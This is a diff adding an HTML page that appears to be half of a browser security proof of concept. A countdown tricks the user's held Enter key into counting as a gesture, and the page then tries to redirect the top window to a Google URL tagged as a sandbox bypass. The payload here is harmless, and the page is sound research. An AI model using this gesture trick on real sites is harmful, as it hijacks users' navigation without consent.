@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Origin B (Vercel)</title>
+    <style>
+        body { font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #efe; }
+        #timer { font-size: 3rem; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>SITE B (Origin: Vercel)</h2>
+    <div id="timer">Tunggu...</div>
+    <div id="status">Jangan lepas dulu!</div>
+
+    <script>
+        setTimeout(() => { document.getElementById('timer').innerText = "3..."; }, 500);
+        setTimeout(() => { document.getElementById('timer').innerText = "2..."; }, 1000);
+        setTimeout(() => { document.getElementById('timer').innerText = "1..."; }, 1500);
+        setTimeout(() => { 
+            document.getElementById('timer').innerText = "LEPAS!"; 
+            document.getElementById('timer').style.color = "red";
+        }, 2000);
+
+        window.addEventListener('keyup', (e) => {
+            if (e.key === 'Enter') {
+                const activationStatus = navigator.userActivation.isActive;
+                console.log("Ghost Gesture Detected? ", activationStatus);
+
+                if (activationStatus) {
+
+                    window.top.location.href = "https://google.com/search?q=BYPASSED_SANDBOX_GHOST_GESTURE";
+                } else {
+                    document.getElementById('status').innerText = "RESULT: FAILED (Activation Reset by Browser)";
+                    document.getElementById('status').style.color = "blue";
+                }
+            }
+        });
+    </script>
+</body>
+</html>
